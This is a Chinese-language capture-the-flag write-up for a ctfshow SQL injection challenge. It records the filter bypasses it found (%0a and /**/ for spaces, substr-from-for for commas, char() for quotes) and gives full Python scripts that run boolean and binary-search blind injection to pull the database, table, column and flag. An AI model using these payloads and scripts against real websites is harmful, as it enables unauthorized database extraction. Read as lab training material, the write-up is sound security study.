这道题是[[ctfshow183sql过滤与爆破]]的升级版
进入题目，给了三个链接，点开链接后发现注入点在于url
![[Pasted image 20260410155723.png]]
开始测试都过滤了哪些字符，在测试过程中发现其后端可能是基于正则匹配，所以只要被过滤的字符一出现就会报错，因此无需关注sql语法是否正确而。
测试结果，被过滤的字符如下：
- 空格%20/+
	- 可用替代%0a
	- /\*\*/
- union
- ' %27
	- 可用替代 "
	- 可用替代char(39)
- and
	- 可用&&
		- 不对，经过进一步测试发现&&会直接导致后面的表达式截断，不能用&&
- or
	- 可用||
- ,
	- 没法用substr(str,1,1)
		- 可以用like或regexp
		- 可以用substr(str from 1 for 1)
## 尝试爆库：
```
import requests

url = "http://2376111d-126f-4928-b3b0-8278a403f64b.challenge.ctf.show/"
pos = 1
chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
nomatch = False
database = ""
for pos in range(1, 20):
    if nomatch:
        break
    for char in chars:
        payload = (
            "?id=0||substr(database()from/**/{}/**/for/**/1)%0aregexp(char({}))".format(
                pos, ord(char)
            )
        )
        response = requests.get(url + payload)
        print(
            "Trying position {} with character '{}': {}".format(
                pos, char, response.status_code
            )
        )
        if (
            "If" in response.text
            and "A Child's Dream of a Star" in response.text
            and "I asked nothing" in response.text
        ):
            print("Found character at position {}: {}".format(pos, char))
            database += char
            break
        if char == chars[-1]:
            print("No character found at position {}".format(pos))
            database += "?"
            nomatch = True
            break
print("Database name: {}".format(database))
```
结果: `Database name: web8?`

## 接下来爆表名
尝试构造测试语句 `https://e8219cac-df34-4691-9fd8-13d945f1a1f9.challenge.ctf.show/index.php?id=0||substr(select/**/table_name/**/from/**/information_schema.columns/**/where/**/database()/**/like/**/%22web8%22)/**/from/**/1/**/for/**/1)/**/regexp(char(46))`
执行错误，发现有个逻辑错误 `where/**/database()/**/like/**/%22web8%22` ，还有返回行数超出限制。
改了一下 `https://e8219cac-df34-4691-9fd8-13d945f1a1f9.challenge.ctf.show/index.php?id=0||substr((select/**/table_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/limit/**/1)/**/from/**/1/**/for/**/1)/**/regexp(char(46))`
成功构造布尔盲注模板
**这里有个教训就是select很可能返回多行，一定注意加上limit**

---

### 为了练习二分法快速盲注，我们抛弃之前的脚本，并对payload进行修改：
测试语句： `https://e8219cac-df34-4691-9fd8-13d945f1a1f9.challenge.ctf.show/index.php?id=0||substr((select/**/table_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/limit/**/1)/**/from/**/1/**/for/**/1)/**/%3E/**/0)`
这里又犯了一个错误，**mysql中字符串和数字进行比较时，其行为模式类似于php 5.4.6和7.1.10之前版本的宽松比较。所以，这段比较逻辑实际上是在说  `0>0`**
再对payload进行修改：
```
https://e8219cac-df34-4691-9fd8-13d945f1a1f9.challenge.ctf.show/index.php?id=0||ascii(substr((select/**/table_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/limit/**/1)/**/from/**/1/**/for/**/1))/**/%3E/**/0)
```
仍然不可用，右式值为假。使用 `id=0||(select/**/table_name/**/from/**/information_schema.columns/**/limit/**/1)/**/is/**/not/**/null` 测试发现非null 。怀疑ascii()无法正常使用。
对ascii()进行测试： `?id=0||ascii("A")%0a>%0a0` 测试结果表示ascii()可以用
重新审视之前的payload,发现原来是末尾多打了个 `)`
修正payload：
```
https://e8219cac-df34-4691-9fd8-13d945f1a1f9.challenge.ctf.show/index.php?id=0||ascii(substr((select/**/table_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/limit/**/1)/**/from/**/1/**/for/**/1))/**/%3E/**/0
```
运行正常，接下来就可以编写二分盲注脚本了。
脚本：
```
import requests

url = "http://0f85cdff-7be8-4a55-91a2-f6ef4ffa7b03.challenge.ctf.show/"


def comp(c_mid):
    payload = (
        f"?id=0||ascii(substr("
        f"(select/**/table_name/**/from/**/information_schema.columns/**/"
        f"where/**/table_schema=database()/**/limit/**/1)"
        f"/**/from/**/{pos}/**/for/**/1))/**/</**/{c_mid}"
    )

    response = requests.get(url + payload)

    if (
        "If" in response.text
        and "A Child's Dream of a Star" in response.text
        and "I asked nothing" in response.text
    ):
        return 1  # char < c_mid
    elif response.status_code == 200:
        return -1  # char >= c_mid
    else:
        return 0


table_name = ""

for pos in range(1, 11):
    c_start, c_end = 32, 126

    while c_start <= c_end:
        c_mid = (c_start + c_end) // 2
        result = comp(c_mid)

        if result == 1:  # 实际字符 < c_mid
            c_end = c_mid - 1
        elif result == -1:  # 实际字符 >= c_mid
            c_start = c_mid + 1
        else:
            raise Exception("Unexpected response")

    table_name += chr(c_start)
    print(table_name)
```
直接就爆出来一个名为flag的表
然后我们进入最终阶段，稍微改一下payload，开始爆字段名：
```
    payload = (
        f"?id=0||ascii(substr("
        f"(select/**/column_name/**/from/**/information_schema.columns/**/"
        f'where/**/table_name="flag"/**/limit/**/1)'
        f"/**/from/**/{pos}/**/for/**/1))/**/</**/{c_mid}"
    )
```
字段名也是flag，这下直接就省掉一堆麻烦。现在开始爆字段值：
```
import requests
import time

url = "http://0f85cdff-7be8-4a55-91a2-f6ef4ffa7b03.challenge.ctf.show/"


def comp(c_mid, pos):
    # payload = (
    #     f"?id=0||ascii(substr("
    #     f"(select/**/column_name/**/from/**/information_schema.columns/**/"
    #     f'where/**/table_name="flag"/**/limit/**/1)'
    #     f"/**/from/**/{pos}/**/for/**/1))/**/</**/{c_mid}"
    # )

    payload = (
        f"?id=0||ascii(substr("
        f"(select/**/flag/**/from/**/flag/**/"
        f"limit/**/1)"
        f"/**/from/**/{pos}/**/for/**/1))/**/</**/{c_mid}"
    )
    response = requests.get(url + payload)
    time.sleep(0.1)

    if (
        "If" in response.text
        and "A Child's Dream of a Star" in response.text
        and "I asked nothing" in response.text
    ):
        return 1
    elif response.status_code == 200:
        return -1
    else:
        return 0


c_mid = 0
flag = ""

for pos in range(1, 50):
    c_start, c_end = 32, 126

    while c_start <= c_end:
        c_mid = (c_start + c_end) // 2
        result = comp(c_mid, pos)

        if result == 1:
            c_end = c_mid - 1
        elif result == -1:
            c_start = c_mid + 1
        else:
            raise Exception("Unexpected response")
        print("\033[2J\033[H", end="")
        print(flag + chr(c_mid))
    if chr(c_mid) == "}":
        break

    flag += chr(c_end)
    print(flag)
```
终于把flag拿到了！
![[Pasted image 20260410200937.png]]

### 总结：算法还是很有用的，抓细节是非常有必要去训练的。